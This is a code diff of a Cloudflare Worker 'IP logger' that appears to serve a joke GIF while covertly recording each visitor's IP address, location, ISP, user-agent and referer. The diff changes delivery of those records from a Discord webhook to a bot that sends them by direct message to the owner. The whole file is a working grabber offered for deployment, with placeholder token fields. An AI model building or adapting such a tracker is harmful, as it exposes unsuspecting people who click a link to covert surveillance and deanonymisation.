@@ -1,7 +1,7 @@
-// /cloudflare worker/worker.js
+// /cloudflare worker/DISCORD_BOT/worker.js
 
-// CONFIGURATION
-const WEBHOOK_URL = "PUT YOUR WEBHOOK HERE";
+const BOT_TOKEN = "PUT_BOT_TOKEN_HERE";
+const OWNER_ID = "PUT_OWNER_ID_HERE";
 const GIF_URL = "https://media.tenor.com/Po3vHMaLLqgAAAAC/ronaldo-osuruk.gif";
 
 export default {
@@ -22,14 +22,13 @@ export default {
         } catch (e) { }
 
         const payload = {
-            username: "Rayzer Logger",
             embeds: [{
-                title: "New Log 🔍",
-                color: 0xf38020,
+                title: "New Log (Discord Bot DM) 🔍",
+                color: 0x5865f2,
                 fields: [
                     { name: "IP", value: `\`${ip}\``, inline: true },
                     { name: "Location", value: `${geoData.city}, ${geoData.regionName}, ${geoData.country}`, inline: true },
-                    { name: "ISP", value: geoData.isp || "Bilinmiyor", inline: false },
+                    { name: "ISP", value: geoData.isp || "Unknown", inline: false },
                     { name: "User-Agent", value: `\`\`\`${userAgent}\`\`\``, inline: false },
                     { name: "Referer", value: referer, inline: false }
                 ],
@@ -38,13 +37,32 @@ export default {
             }]
         };
 
-        ctx.waitUntil(
-            fetch(WEBHOOK_URL, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify(payload)
-            })
-        );
+        const apiBase = "https://discord.com/api/v10";
+        const headers = {
+            "Content-Type": "application/json",
+            "Authorization": `Bot ${BOT_TOKEN}`
+        };
+
+        ctx.waitUntil((async () => {
+            try {
+                // 1. Create DM Channel with Owner
+                const dmRes = await fetch(`${apiBase}/users/@me/channels`, {
+                    method: "POST",
+                    headers: headers,
+                    body: JSON.stringify({ recipient_id: OWNER_ID })
+                });
+                const dmChannel = await dmRes.json();
+
+                if (dmChannel.id) {
+                    // 2. Send Message to DM Channel
+                    await fetch(`${apiBase}/channels/${dmChannel.id}/messages`, {
+                        method: "POST",
+                        headers: headers,
+                        body: JSON.stringify(payload)
+                    });
+                }
+            } catch (e) { }
+        })());
 
         return new Response(`
       <!DOCTYPE html>
